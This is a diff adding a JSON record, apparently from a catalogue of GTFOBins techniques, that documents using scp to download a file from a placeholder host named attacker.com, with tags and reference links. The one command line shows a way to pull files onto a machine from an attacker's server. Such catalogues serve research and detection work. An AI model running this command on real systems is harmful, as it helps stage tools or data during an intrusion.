@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-scp-download",
+  "name": "GTFOBins · scp (download)",
+  "command": "scp user@attacker.com:/path/to/input-file /path/to/output-file",
+  "description": "Use scp to download via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "scp",
+    "download"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/scp/#download",
+  "upstream_id": "scp/download/0",
+  "category": "gtfobins",
+  "subcategory": "file-download",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/scp/"
+    }
+  ]
+}
